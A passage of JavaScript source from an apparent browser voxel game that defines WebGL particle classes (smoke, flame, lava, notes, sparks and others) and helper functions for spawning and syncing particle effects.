			modelMatrix.transpose()//for normal
			const x = round(this.x)
			const y = round(this.y)
			const z = round(this.z)
			const blockLight = this.glow ? 1 : world.getLight(x, y, z, 1, this.dimension)/15
			const skysLight = world.getLight(x, y, z, 0, this.dimension)/15
			gl.uniform1i(glCache.uSamplerParticle, 0)
      if(this.tint) gl.uniform3f(glCache.tintParticle, this.tint[0],this.tint[1],this.tint[2])
      if(this.tintGray) gl.uniform1i(glCache.tintGrayParticle, 1)
			gl.uniform1f(glCache.uBlockLightParticle, blockLight)
			gl.uniform1f(glCache.uSkylightParticle, skysLight)
			gl.uniform3f(glCache.uPosParticle, p.renderX-this.x, p.renderY-this.y, p.renderZ-this.z)
			gl.uniformMatrix4fv(glCache.uViewParticle, false, modelViewProjectionMatrix.elements)
			gl.uniformMatrix4fv(glCache.uModelMatParticle, false, modelMatrix.elements)
			glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
			gl.drawElements(gl.TRIANGLES, 6 * this.faces, gl.UNSIGNED_INT, 0)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
      if(this.tint) gl.uniform3f(glCache.tintParticle, 1,1,1)
      if(this.tintGray) gl.uniform1i(glCache.tintGrayParticle, 0)
		}
	}
  
  entities[entities.length] = class BlockParticle extends Particle{
		static name2 = "BlockParticle"
    constructor(tex, x,y,z, type, id){
      let s=0.25
      let offX = rand(0.75), offY = rand(0.75)
      let velx = (Math.random()-0.5) * 0.4,
          vely = Math.random() * 0.4,
          velz = (Math.random()-0.5) * 0.4
      let despawn = Math.random()*3000
      switch(type){
        case "breaking":
          s /= 2
          despawn /= 4
          velx /= 2
          vely /= 2
          velz /= 2
          break
        case "eating":
          s /= 2
          velx /= 2
          vely /= 2
          velz /= 2
          break
      }
      const shape = shapes.blockParticle
      const shapeVerts = shape.verts
      const shapeTexVerts = shape.texVerts
      const size = shape.size
      let blockSides = Object.keys(Block)
      let texture = []
      let index = 0
      for (let n = 0; n < 6; n++) {
        let side = blockSides[n]
        let directionalFaces = shapeVerts[n]
        for (let facei = 0; facei < directionalFaces.length; facei++) {
          let texVerts = textureCoords[textureMap[tex]]
          let tx = texVerts[0]
          let ty = texVerts[1]
					let tw = texVerts[2]-tx
					let th = texVerts[5]-ty
					tx += tw*offX
					ty += th*offY
					let texShapeVerts = shapeTexVerts[n][facei]
					texture[index    ] = tx + texShapeVerts[0]*tw/4
					texture[index + 1] = ty + texShapeVerts[1]*th/4
					texture[index + 2] = tx + texShapeVerts[2]*tw/4
					texture[index + 3] = ty + texShapeVerts[3]*th/4
					texture[index + 4] = tx + texShapeVerts[4]*tw/4
					texture[index + 5] = ty + texShapeVerts[5]*th/4
					texture[index + 6] = tx + texShapeVerts[6]*tw/4
					texture[index + 7] = ty + texShapeVerts[7]*th/4
          index += 8
        }
      }
      super(x, y, z, 0, 0, velx, vely, velz, s, s, s, new Float32Array(shapeVerts.flat(Infinity)), new Float32Array(texture), size, despawn)

      this.gravityStength = -0.04
      this.thisType = type
      this.block = id, this.tex = tex
    }
    update(){
			this.updateVelocity(now)
			this.move(now)
			if (now - this.spawn > this.despawns) {
				this.canDespawn = true
			}
      var id = this.block
      if(id && blockData[id].tint){
        var biome = world.getBiome(round(this.x),round(this.y),round(this.z),this.dimension)
        var tints = blockData[id].tint
        this.tint = tints[biome] || tints.default
        this.tintGray = true
      }
      
      this.canFacePlayer = true
    }
  }
  
  entities[entities.length] = class PoofParticle extends Particle{
		static name2 = "PoofParticle"
    constructor(x,y,z){
      super(x, y, z, 0, 0, rand(-0.05, 0.05), 0, rand(-0.05, 0.05), 0.5, 0.5, 0.5, null, null, genericVaos.size, rand(1000, 3000), genericVaos[floor(rand(8))])
      this.brightness = rand(0.8, 1)
      this.speed = rand(0.01, 0.05)
			this.tint = [this.brightness,this.brightness,this.brightness]
    }
    update(){
			this.updateVelocity(now)
      this.vely = this.speed
			this.move(now)
			if (now - this.spawn > this.despawns) {
				this.canDespawn = true
			}
      
      this.canFacePlayer = true
    }
    render(){
      totalEntites++
      if(!p.camera.canSeeEntity(this.x,this.y,this.z,this.width,this.height,this.depth)) return
      renderedEntities++

      if(this.canFacePlayer){
        this.facePlayer()
        this.canFacePlayer = false
      }
      
			const modelMatrix = new Matrix();
			modelMatrix.identity()
			modelMatrix.translate(this.x, this.y, this.z)
			modelMatrix.rotY(this.yaw)
			modelMatrix.rotX(this.pitch)
			modelMatrix.scale(this.width, this.height, this.depth)
			const viewMatrix = p.camera.transformation.elements
			const proj = p.camera.projection
			const projectionMatrix = [proj[0], 0, 0, 0, 0, proj[1], 0, 0, 0, 0, proj[2], proj[3], 0, 0, proj[4], 0]
			const modelViewProjectionMatrix = new Matrix()
			modelViewProjectionMatrix.identity()
			modelViewProjectionMatrix.mult(projectionMatrix)
			modelViewProjectionMatrix.mult(viewMatrix)
			modelViewProjectionMatrix.mult(modelMatrix.elements)
			// row major to column major
			modelViewProjectionMatrix.transpose()
			modelMatrix.transpose()//for normal
			const x = round(this.x)
			const y = round(this.y)
			const z = round(this.z)
			const blockLight = world.getLight(x, y, z, 1, this.dimension)/15
			const skysLight = world.getLight(x, y, z, 0, this.dimension)/15
			gl.uniform1i(glCache.uSamplerParticle, 0)
			gl.uniform1f(glCache.uBlockLightParticle, blockLight)
			gl.uniform1f(glCache.uSkylightParticle, skysLight)
      if(this.tint) gl.uniform3f(glCache.tintParticle, this.tint[0],this.tint[1],this.tint[2])
			gl.uniform3f(glCache.uPosParticle, p.renderX-this.x, p.renderY-this.y, p.renderZ-this.z)
			gl.uniformMatrix4fv(glCache.uViewParticle, false, modelViewProjectionMatrix.elements)
			gl.uniformMatrix4fv(glCache.uModelMatParticle, false, modelMatrix.elements)
			glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
			gl.drawElements(gl.TRIANGLES, 6 * this.faces, gl.UNSIGNED_INT, 0)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
      if(this.tint) gl.uniform3f(glCache.tintParticle, 1,1,1)
    }
  }
  function poof(x,y,z,amount,dimension, w,h,d, unremote){
		if(!amount) amount = w*h*d*20
    if(!performFast) for(var i=0; i<amount; i++){
      world.addParticle(new entities[entityIds.PoofParticle](x+rand(-w/2,w/2),y+rand(-h/2,h/2),z+rand(-d/2,d/2)), dimension)
    }
    if(unremote) send({
      type:"particles",particleType:"poof",
      x,y,z,dimension,amount,data:{w,h,d}
    })
  }
  win.poof = poof
  function playerPoof(player){
		if(performFast) return
    let {x,y,z,dimension} = player
    y += player.offsetY
    y -= 1/4
    let space = 1/4
    let w2 = 1 * 1
    let d2 = 1 * 1
    let h2 = 1.2 * 1.2

    for (let Y = -h2; Y < h2; Y+=space) {
      for (let X = -w2; X <= w2; X+=space) {
        for (let Z = -d2; Z <= d2; Z+=space) {
          let n = X * X / w2 + Y * Y / h2 + Z * Z / d2
          if (n < 1) {
            world.addParticle(new entities[entityIds.PoofParticle](x+X,y+Y-1,z+Z), dimension)
          }
        }
      }
    }
  }
  win.playerPoof = playerPoof
  
  entities[entities.length] = class FallingDustParticle extends Particle{
		static name2 = "FallingDustParticle"
    constructor(x,y,z, tint){
      super(x, y, z, 0, 0, 0, 0, 0, 0.25, 0.25, 0.25, null, null, genericVaos.size, rand(4000, 8000), genericVaos[floor(rand(8))])
      this.tint = tint
      this.gravityStength = -0.008
    }
    update(){
			this.updateVelocity(now)
			this.move(now)
			if (now - this.spawn > this.despawns) {
				this.canDespawn = true
			}
      if(this.onGround) this.canDespawn = true
      
      this.canFacePlayer = true
    }
    render(){
      totalEntites++
      if(!p.camera.canSeeEntity(this.x,this.y,this.z,this.width,this.height,this.depth)) return
      renderedEntities++

      if(this.canFacePlayer){
        this.facePlayer()
        this.canFacePlayer = false
      }
      let diff = (now - this.lastUpdate) / tickTime
			if (diff > 1) diff = 1
      let renderx = (this.x - this.previousX) * diff + this.previousX
			let rendery = (this.y - this.previousY) * diff + this.previousY
			let renderz = (this.z - this.previousZ) * diff + this.previousZ
      
			const modelMatrix = new Matrix();
			modelMatrix.identity()
			modelMatrix.translate(renderx, rendery, renderz)
			modelMatrix.rotY(this.yaw)
			modelMatrix.rotX(this.pitch)
			modelMatrix.scale(this.width, this.height, this.depth)
			const viewMatrix = p.camera.transformation.elements
			const proj = p.camera.projection
			const projectionMatrix = [proj[0], 0, 0, 0, 0, proj[1], 0, 0, 0, 0, proj[2], proj[3], 0, 0, proj[4], 0]
			const modelViewProjectionMatrix = new Matrix()
			modelViewProjectionMatrix.identity()
			modelViewProjectionMatrix.mult(projectionMatrix)
			modelViewProjectionMatrix.mult(viewMatrix)
			modelViewProjectionMatrix.mult(modelMatrix.elements)
			// row major to column major
			modelViewProjectionMatrix.transpose()
			modelMatrix.transpose()//for normal
			const x = round(this.x)
			const y = round(this.y)
			const z = round(this.z)
			const blockLight = world.getLight(x, y, z, 1, this.dimension)/15
			const skysLight = world.getLight(x, y, z, 0, this.dimension)/15
			gl.uniform1i(glCache.uSamplerParticle, 0)
			gl.uniform1f(glCache.uBlockLightParticle, blockLight)
			gl.uniform1f(glCache.uSkylightParticle, skysLight)
			gl.uniform3f(glCache.uPosParticle, p.renderX-this.x, p.renderY-this.y, p.renderZ-this.z)
			gl.uniformMatrix4fv(glCache.uViewParticle, false, modelViewProjectionMatrix.elements)
			gl.uniformMatrix4fv(glCache.uModelMatParticle, false, modelMatrix.elements)
      if(this.tint) gl.uniform3f(glCache.tintParticle, this.tint[0],this.tint[1],this.tint[2])
			glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
			gl.drawElements(gl.TRIANGLES, 6 * this.faces, gl.UNSIGNED_INT, 0)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
      if(this.tint) gl.uniform3f(glCache.tintParticle, 1,1,1)
    }
  }

  entities[entities.length] = class RedstoneParticle extends Particle{
		static name2 = "RedstoneParticle"
    constructor(x,y,z, tint, blue){
      var s = rand(0.125,0.5)
      super(x, y, z, 0, 0, rand(-0.01,0.01), rand(-0.01,0.01), rand(-0.01,0.01), s, s, s, null, null, genericVaos.size, genericVaos.length*tickTime, genericVaos[genericVaos.length-1])
      this.tint = tint || blockData[blockIds.redstoneDust][blue ? "blueTint" : "tint"][round(rand(10,15))]
    }
    update(){
			this.updateVelocity(now)
      this.vely = 0.01
			this.move(now)
      this.vao = genericVaos[genericVaos.length-1-floor((now-this.spawn)/tickTime)]
			if (now - this.spawn > this.despawns) {
				this.canDespawn = true
			}
      
      this.canFacePlayer = true
    }
    render(){
      totalEntites++
      if(!p.camera.canSeeEntity(this.x,this.y,this.z,this.width,this.height,this.depth)) return
      renderedEntities++

      if(this.canFacePlayer){
        this.facePlayer()
        this.canFacePlayer = false
      }
      let diff = (now - this.lastUpdate) / tickTime
			if (diff > 1) diff = 1
      let renderx = (this.x - this.previousX) * diff + this.previousX
			let rendery = (this.y - this.previousY) * diff + this.previousY
			let renderz = (this.z - this.previousZ) * diff + this.previousZ
      
			const modelMatrix = new Matrix();
			modelMatrix.identity()
			modelMatrix.translate(renderx, rendery, renderz)
			modelMatrix.rotY(this.yaw)
			modelMatrix.rotX(this.pitch)
			modelMatrix.scale(this.width, this.height, this.depth)
			const viewMatrix = p.camera.transformation.elements
			const proj = p.camera.projection
			const projectionMatrix = [proj[0], 0, 0, 0, 0, proj[1], 0, 0, 0, 0, proj[2], proj[3], 0, 0, proj[4], 0]
			const modelViewProjectionMatrix = new Matrix()
			modelViewProjectionMatrix.identity()
			modelViewProjectionMatrix.mult(projectionMatrix)
			modelViewProjectionMatrix.mult(viewMatrix)
			modelViewProjectionMatrix.mult(modelMatrix.elements)
			// row major to column major
			modelViewProjectionMatrix.transpose()
			modelMatrix.transpose()//for normal
			const x = round(this.x)
			const y = round(this.y)
			const z = round(this.z)
			const blockLight = world.getLight(x, y, z, 1, this.dimension)/15
			const skysLight = world.getLight(x, y, z, 0, this.dimension)/15
			gl.uniform1i(glCache.uSamplerParticle, 0)
			gl.uniform1f(glCache.uBlockLightParticle, blockLight)
			gl.uniform1f(glCache.uSkylightParticle, skysLight)
			gl.uniform3f(glCache.uPosParticle, p.renderX-this.x, p.renderY-this.y, p.renderZ-this.z)
			gl.uniformMatrix4fv(glCache.uViewParticle, false, modelViewProjectionMatrix.elements)
			gl.uniformMatrix4fv(glCache.uModelMatParticle, false, modelMatrix.elements)
      if(this.tint) gl.uniform3f(glCache.tintParticle, this.tint[0],this.tint[1],this.tint[2])
			glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
			gl.drawElements(gl.TRIANGLES, 6 * this.faces, gl.UNSIGNED_INT, 0)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
      if(this.tint) gl.uniform3f(glCache.tintParticle, 1,1,1)
    }
  }
  
  entities[entities.length] = class ShockwaveParticle extends Particle{
		static name2 = "ShockwaveParticle"
    constructor(x,y,z, delay){
      var vao = shockwaveVaos[8]
      var frameTime = 25
      super(x, y, z, 0, 0, 0, 0, 0, 2, 2, 2, null, null, shockwaveVaos.size, shockwaveVaos.length*frameTime, vao)
      this.index = 0
      this.brightness = (Math.random()/2)+0.5
      this.frameTime = frameTime
      this.delay = delay || 0
      this.hidden = true
			this.tint = [this.brightness,this.brightness,this.brightness]
    }
    update(){
      if(this.hidden){
        if(now - this.spawn > this.delay){
          this.hidden = false
          this.spawn = now
        }else return
      }
			if (now - this.spawn > this.despawns) {
				this.canDespawn = true
			}
      this.index = Math.floor((now - this.spawn) / this.frameTime)
      this.vao = shockwaveVaos[this.index]
      
      this.canFacePlayer = true
    }
    render(){
      totalEntites++
      if(this.hidden || !p.camera.canSeeEntity(this.x,this.y,this.z,this.width,this.height,this.depth)) return
      renderedEntities++
      
      if(this.canFacePlayer){
        this.facePlayer()
        this.canFacePlayer = false
      }
      
			const modelMatrix = new Matrix();
			modelMatrix.identity()
			modelMatrix.translate(this.x, this.y, this.z)
			modelMatrix.rotY(this.yaw)
			modelMatrix.rotX(this.pitch)
			modelMatrix.scale(this.width, this.height, this.depth)
			const viewMatrix = p.camera.transformation.elements
			const proj = p.camera.projection
			const projectionMatrix = [proj[0], 0, 0, 0, 0, proj[1], 0, 0, 0, 0, proj[2], proj[3], 0, 0, proj[4], 0]
			const modelViewProjectionMatrix = new Matrix()
			modelViewProjectionMatrix.identity()
			modelViewProjectionMatrix.mult(projectionMatrix)
			modelViewProjectionMatrix.mult(viewMatrix)
			modelViewProjectionMatrix.mult(modelMatrix.elements)
			// row major to column major
			modelViewProjectionMatrix.transpose()
			modelMatrix.transpose()//for normal
			const x = round(this.x)
			const y = round(this.y)
			const z = round(this.z)
			const blockLight = world.getLight(x, y, z, 1, this.dimension)/15
			const skysLight = world.getLight(x, y, z, 0, this.dimension)/15
			gl.uniform1i(glCache.uSamplerParticle, 0)
			gl.uniform1f(glCache.uBlockLightParticle, blockLight)
			gl.uniform1f(glCache.uSkylightParticle, skysLight)
      if(this.tint) gl.uniform3f(glCache.tintParticle, this.tint[0],this.tint[1],this.tint[2])
			gl.uniform3f(glCache.uPosParticle, p.renderX-this.x, p.renderY-this.y, p.renderZ-this.z)
			gl.uniformMatrix4fv(glCache.uViewParticle, false, modelViewProjectionMatrix.elements)
			gl.uniformMatrix4fv(glCache.uModelMatParticle, false, modelMatrix.elements)
			glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
			gl.drawElements(gl.TRIANGLES, 6 * this.faces, gl.UNSIGNED_INT, 0)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
      if(this.tint) gl.uniform3f(glCache.tintParticle, 1,1,1)
    }
  }
  
  entities[entities.length] = class SmokeParticle extends Particle{
		static name2 = "SmokeParticle"
    constructor(x,y,z){
      var frameTime = tickTime
      super(x, y, z, 0, 0, rand(-0.02,0.02), 0, rand(-0.02,0.02), 0.125, 0.125, 0.125, null, null, genericVaos.size, genericVaos.length*frameTime, genericVaos[0])
      this.brightness = rand(0, 0.2)
      this.speed = 0.05
      this.frameTime = frameTime
			this.tint = [this.brightness,this.brightness,this.brightness]
    }
    update(){
			this.updateVelocity(now)
      this.vely = this.speed
			this.move(now)
			if (now - this.spawn > this.despawns) {
				this.canDespawn = true
			}
      
      this.index = genericVaos.length - 1 - Math.floor((now - this.spawn) / this.frameTime)
      this.vao = genericVaos[this.index]
      
      this.canFacePlayer = true
    }
    render(){
      totalEntites++
      if(!p.camera.canSeeEntity(this.x,this.y,this.z,this.width,this.height,this.depth)) return
      renderedEntities++

      if(this.canFacePlayer){
        this.facePlayer()
        this.canFacePlayer = false
      }
      
			const modelMatrix = new Matrix();
			modelMatrix.identity()
			modelMatrix.translate(this.x, this.y, this.z)
			modelMatrix.rotY(this.yaw)
			modelMatrix.rotX(this.pitch)
			modelMatrix.scale(this.width, this.height, this.depth)
			const viewMatrix = p.camera.transformation.elements
			const proj = p.camera.projection
			const projectionMatrix = [proj[0], 0, 0, 0, 0, proj[1], 0, 0, 0, 0, proj[2], proj[3], 0, 0, proj[4], 0]
			const modelViewProjectionMatrix = new Matrix()
			modelViewProjectionMatrix.identity()
			modelViewProjectionMatrix.mult(projectionMatrix)
			modelViewProjectionMatrix.mult(viewMatrix)
			modelViewProjectionMatrix.mult(modelMatrix.elements)
			// row major to column major
			modelViewProjectionMatrix.transpose()
			modelMatrix.transpose()//for normal
			const x = round(this.x)
			const y = round(this.y)
			const z = round(this.z)
			const blockLight = world.getLight(x, y, z, 1, this.dimension)/15
			const skysLight = world.getLight(x, y, z, 0, this.dimension)/15
			gl.uniform1i(glCache.uSamplerParticle, 0);
			gl.uniform1f(glCache.uBlockLightParticle, blockLight)
			gl.uniform1f(glCache.uSkylightParticle, skysLight)
      if(this.tint) gl.uniform3f(glCache.tintParticle, this.tint[0],this.tint[1],this.tint[2])
			gl.uniform3f(glCache.uPosParticle, p.renderX-this.x, p.renderY-this.y, p.renderZ-this.z)
			gl.uniformMatrix4fv(glCache.uViewParticle, false, modelViewProjectionMatrix.elements)
			gl.uniformMatrix4fv(glCache.uModelMatParticle, false, modelMatrix.elements)
			glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
			gl.drawElements(gl.TRIANGLES, 6 * this.faces, gl.UNSIGNED_INT, 0)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
      if(this.tint) gl.uniform3f(glCache.tintParticle, 1,1,1)
    }
  }
  
  entities[entities.length] = class NoteParticle extends Particle{
		static name2 = "NoteParticle"
    constructor(x,y,z, note){
      let tex = "note"
      const shape = shapes.blockParticle
      const shapeVerts = shape.verts
      const shapeTexVerts = shape.texVerts
      const size = shape.size
      let blockSides = Object.keys(Block)
      let texture = []
      let index = 0
      for (let n = 0; n < 6; n++) {
        let side = blockSides[n]
        let directionalFaces = shapeVerts[n]
        for (let facei = 0; facei < directionalFaces.length; facei++) {
          let texVerts = textureCoords[textureMap[tex]]
          let tx = texVerts[0]
          let ty = texVerts[1]
					let tw = texVerts[2]-tx
					let th = texVerts[5]-ty
					let texShapeVerts = shapeTexVerts[n][facei]
					texture[index    ] = tx + texShapeVerts[0]*tw
					texture[index + 1] = ty + texShapeVerts[1]*th
					texture[index + 2] = tx + texShapeVerts[2]*tw
					texture[index + 3] = ty + texShapeVerts[3]*th
					texture[index + 4] = tx + texShapeVerts[4]*tw
					texture[index + 5] = ty + texShapeVerts[5]*th
					texture[index + 6] = tx + texShapeVerts[6]*tw
					texture[index + 7] = ty + texShapeVerts[7]*th
          index += 8
        }
      }
      super(x, y, z, 0, 0, 0,0,0, 0.25, 0.25, 0.25, new Float32Array(shapeVerts.flat(Infinity)), new Float32Array(texture), size, 1000)
      this.startY = y
      
      var r = 0, g = 0, b = 0
      switch(note){
        case 0:
          r = 119
          g = 215
          break
        case 1:
          r = 149
          g = 192
          break
        case 2:
          r = 178
          g = 165
          break
        case 3:
          r = 204
          g = 134
          break
        case 4:
          r = 226
          g = 101
          break
        case 5:
          r = 243
          g = 65
          break
        case 6:
          r = 252
          g = 30
          break
        case 7:
          r = 254
          b = 15
          break
        case 8:
          r = 247
          b = 51
        case 9:
          r = 232
          b = 90
          break
        case 10:
          r = 207
          b = 131
          break
        case 11:
          r = 174
          b = 169
          break
        case 12:
          r = 134
          b = 204
          break
        case 13:
          r = 91
          b = 231
          break
        case 14:
          r = 45
          b = 249
          break
        case 15:
          r = 2
          g = 10
          b = 254
          break
        case 16:
          g = 55
          b = 246
          break
        case 17:
          g = 104
          b = 224
          break
        case 18:
          g = 154
          b = 188
          break
        case 19:
          g = 198
          b = 141
          break
        case 20:
          g = 233
          b = 88
          break
        case 21:
          g = 252
          b = 33
          break
        case 22:
          r = 31
          g = 252
          break
        case 23:
          r = 89
          g = 232
          break
        case 24:
          r = 148
          g = 193
          break
      }
      this.tint = [r/255,g/255,b/255]
    }
    update() {
      this.previousX = this.x
      this.previousY = this.y
      this.previousZ = this.z
			this.y = lerp(0.5, this.y,this.startY+0.5)
			if (now - this.spawn > this.despawns) {
				this.canDespawn = true
			}
      
      this.canFacePlayer = true
		}
  }
	entities[entities.length] = class HeartParticle extends Particle{
		static name2 = "HeartParticle"
    constructor(x,y,z){
      let tex = "heartParticle"
      const shape = shapes.blockParticle
      const shapeVerts = shape.verts
      const shapeTexVerts = shape.texVerts
      const size = shape.size
      let blockSides = Object.keys(Block)
      let texture = []
      let index = 0
      for (let n = 0; n < 6; n++) {
        let side = blockSides[n]
        let directionalFaces = shapeVerts[n]
        for (let facei = 0; facei < directionalFaces.length; facei++) {
          let texVerts = textureCoords[textureMap[tex]]
          let tx = texVerts[0]
          let ty = texVerts[1]
					let tw = texVerts[2]-tx
					let th = texVerts[5]-ty
					let texShapeVerts = shapeTexVerts[n][facei]
					texture[index    ] = tx + texShapeVerts[0]*tw
					texture[index + 1] = ty + texShapeVerts[1]*th
					texture[index + 2] = tx + texShapeVerts[2]*tw
					texture[index + 3] = ty + texShapeVerts[3]*th
					texture[index + 4] = tx + texShapeVerts[4]*tw
					texture[index + 5] = ty + texShapeVerts[5]*th
					texture[index + 6] = tx + texShapeVerts[6]*tw
					texture[index + 7] = ty + texShapeVerts[7]*th
          index += 8
        }
      }
      super(x, y, z, 0, 0, 0,0,0, 0.25, 0.25, 0.25, new Float32Array(shapeVerts.flat(Infinity)), new Float32Array(texture), size, 1000)
      this.startY = y
    }
    update() {
      this.previousX = this.x
      this.previousY = this.y
      this.previousZ = this.z
			this.y = lerp(0.5, this.y,this.startY+0.5)
			if (now - this.spawn > this.despawns) {
				this.canDespawn = true
			}
      
      this.canFacePlayer = true
		}
  }

  entities[entities.length] = class GlintParticle extends Particle{
		static name2 = "GlintParticle"
    constructor(x,y,z){
      const shape = shapes.blockParticle
      const shapeVerts = shape.verts
      const shapeTexVerts = shape.texVerts
      const size = shape.size
      let blockSides = Object.keys(Block)
      let texture = []
      let index = 0
      for (let n = 0; n < 6; n++) {
        let side = blockSides[n]
        let directionalFaces = shapeVerts[n]
        for (let facei = 0; facei < directionalFaces.length; facei++) {
          let texVerts = textureCoords[textureMap.glint]
          let tx = texVerts[0]
          let ty = texVerts[1]
					let tw = texVerts[2]-tx
					let th = texVerts[5]-ty
					let texShapeVerts = shapeTexVerts[n][facei]
					texture[index    ] = tx + texShapeVerts[0]*tw
					texture[index + 1] = ty + texShapeVerts[1]*th
					texture[index + 2] = tx + texShapeVerts[2]*tw
					texture[index + 3] = ty + texShapeVerts[3]*th
					texture[index + 4] = tx + texShapeVerts[4]*tw
					texture[index + 5] = ty + texShapeVerts[5]*th
					texture[index + 6] = tx + texShapeVerts[6]*tw
					texture[index + 7] = ty + texShapeVerts[7]*th
          index += 8
        }
      }
      super(x, y, z, 0, 0, rand(-0.001,0.001),rand(-0.001,0.001),rand(-0.001,0.001), 0.25, 0.25, 0.25, new Float32Array(shapeVerts.flat(Infinity)), new Float32Array(texture), size, rand(3000))
      this.gravityStength = 0
    }
    updateVelocity(){}
  }
  function glint(x,y,z,dimension,remote){
    for(var i = 0; i<20; i++){
      world.addParticle(new entities[entityIds.GlintParticle](rand(x-.6,x+.6),rand(y-.6,y+.6),rand(z-.6,z+.6)),dimension)
    }
    if(!remote) send({
      type:"particles", particleType:"glint",
      x,y,z,dimension
    })
  }
  win.glint = glint
  entities[entities.length] = class FlameParticle extends Particle{
		static name2 = "FlameParticle"
    constructor(x,y,z,type){
      const shape = shapes.blockParticle
      const shapeVerts = shape.verts
      const shapeTexVerts = shape.texVerts
      const size = shape.size
      let blockSides = Object.keys(Block)
      let texture = []
      let index = 0
      var tex = type === "soul" ? "soulFireFlame" : "flame"
      for (let n = 0; n < 6; n++) {
        let side = blockSides[n]
        let directionalFaces = shapeVerts[n]
        for (let facei = 0; facei < directionalFaces.length; facei++) {
          let texVerts = textureCoords[textureMap[tex]]
          let tx = texVerts[0]
          let ty = texVerts[1]
					let tw = texVerts[2]-tx
					let th = texVerts[5]-ty
					let texShapeVerts = shapeTexVerts[n][facei]
					texture[index    ] = tx + texShapeVerts[0]*tw
					texture[index + 1] = ty + texShapeVerts[1]*th
					texture[index + 2] = tx + texShapeVerts[2]*tw
					texture[index + 3] = ty + texShapeVerts[3]*th
					texture[index + 4] = tx + texShapeVerts[4]*tw
					texture[index + 5] = ty + texShapeVerts[5]*th
					texture[index + 6] = tx + texShapeVerts[6]*tw
					texture[index + 7] = ty + texShapeVerts[7]*th
          index += 8
        }
      }
      super(x, y+0.125, z, 0, 0, 0,0,0, 0.25, 0.25, 0.25, new Float32Array(shapeVerts.flat(Infinity)), new Float32Array(texture), size, 2000)
    }
    update() {
      this.width = this.height = this.depth = lerp((now - this.spawn) / this.despawns, 0.25, 0)
      if (now - this.spawn > this.despawns) {
				this.canDespawn = true
			}
      this.canFacePlayer = true
		}
  }
  entities[entities.length] = class LavaParticle extends Particle{
		static name2 = "LavaParticle"
    constructor(x,y,z){
      const shape = shapes.blockParticle
      const shapeVerts = shape.verts
      const shapeTexVerts = shape.texVerts
      const size = shape.size
      let blockSides = Object.keys(Block)
      let texture = []
      let index = 0
      for (let n = 0; n < 6; n++) {
        let side = blockSides[n]
        let directionalFaces = shapeVerts[n]
        for (let facei = 0; facei < directionalFaces.length; facei++) {
          let texVerts = textureCoords[textureMap.lavaParticle]
          let tx = texVerts[0]
          let ty = texVerts[1]
					let tw = texVerts[2]-tx
					let th = texVerts[5]-ty
					let texShapeVerts = shapeTexVerts[n][facei]
					texture[index    ] = tx + texShapeVerts[0]*tw
					texture[index + 1] = ty + texShapeVerts[1]*th
					texture[index + 2] = tx + texShapeVerts[2]*tw
					texture[index + 3] = ty + texShapeVerts[3]*th
					texture[index + 4] = tx + texShapeVerts[4]*tw
					texture[index + 5] = ty + texShapeVerts[5]*th
					texture[index + 6] = tx + texShapeVerts[6]*tw
					texture[index + 7] = ty + texShapeVerts[7]*th
          index += 8
        }
      }
      super(x, y+0.125, z, 0, 0, rand(-0.4,0.4),0.2,rand(-0.4,0.4), 0.25, 0.25, 0.25, new Float32Array(shapeVerts.flat(Infinity)), new Float32Array(texture), size, 2000)
      this.gravityStength = -0.024
			this.glow = true
    }
    update() {
      world.addParticle(new entities[entityIds.SmokeParticle](this.x,this.y,this.z), this.dimension)
			this.updateVelocity(now)
			this.move(now)
      if (now - this.spawn > this.despawns || this.liquid && now - this.spawn > 500) {
				this.canDespawn = true
			}
      if(this.hasCollided){
        this.width = this.height = this.depth = this.width - 0.02
        if(this.width <= 0) this.canDespawn = true
      }
      this.canFacePlayer = true
		}
  }

  entities[entities.length] = class DripParticle extends Particle{
		static name2 = "DripParticle"
    constructor(x,y,z,tint,splash){
      super(x, y-0.125, z, 0, 0, 0, 0, 0, 0.25, 0.25, 0.25, null, null, dripVaos.size, 20000, dripVaos.hang)
      this.tint = tint
      this.gravityStength = -0.065
      this.delay = Math.random()*2000
      this.animation = 0
      this.splash = splash
    }
    update(){
			this.updateVelocity(now)
      let delay = now - this.spawn < this.delay
      if(delay) this.vely = 0
			this.move(now)
      if(this.onGround && !delay){
        this.animation += 0.125
        this.vao = dripVaos.land
        if(this.animation > 1 || this.splash){
          this.canDespawn = true
          if(this.splash) world.addParticle(new entities[entityIds.SplashParticle](this.x,this.y,this.z),this.dimension)
        }
      }else if(!delay) this.vao = dripVaos.fall
			if (now - this.spawn > this.despawns || this.liquid && now - this.spawn > 500) {
				this.canDespawn = true
			}
      this.canFacePlayer = true
    }
  }
  entities[entities.length] = class SplashParticle extends Particle{
		static name2 = "SplashParticle"
    constructor(x,y,z){
      var s = 0.5
      super(x, y, z, 0, 0, rand(-0.3,0.3), rand(0.4,0.7), rand(-0.3,0.3), s, s, s, null, null, splashVaos.size, 20000, splashVaos[floor(rand(4))])
      this.gravityStength = -0.032
    }
    update(){
			this.updateVelocity(now)
			this.move(now)
			if (now - this.spawn > this.despawns || this.onGround || this.liquid && now - this.spawn > 500) {
				this.canDespawn = true
			}
      this.canFacePlayer = true
    }
  }
	entities[entities.length] = class Spark extends Particle{
		static name2 = "Spark"
    constructor(x,y,z,vx,vy,vz,color){
      var frameTime = tickTime*10
      super(x, y, z, 0, 0, vx, vy, vz, 0.5, 0.5, 0.5, null, null, sparkVaos.size, sparkVaos.length*frameTime, sparkVaos[0])
      this.tint = color
      this.speed = 0.05
      this.frameTime = frameTime
			this.glow = true
    }
		updateVelocity(){
			let drag = 0.9
			this.velz += (this.velz * drag - this.velz)
			this.vely -= 0.02
			this.vely += (this.vely * drag - this.vely)
			this.velx += (this.velx * drag - this.velx)
		}
    update(){
			this.updateVelocity(now)
			this.move(now)
			if (now - this.spawn > this.despawns) {
				this.canDespawn = true
			}
      
      this.index = sparkVaos.length - 1 - Math.floor((now - this.spawn) / this.frameTime)
      this.vao = sparkVaos[this.index]
      
      this.canFacePlayer = true
    }
	}
	function fireworkExplode(x,y,z,dimension,type,color,remote){
		for(let i=0; i<100; i++){
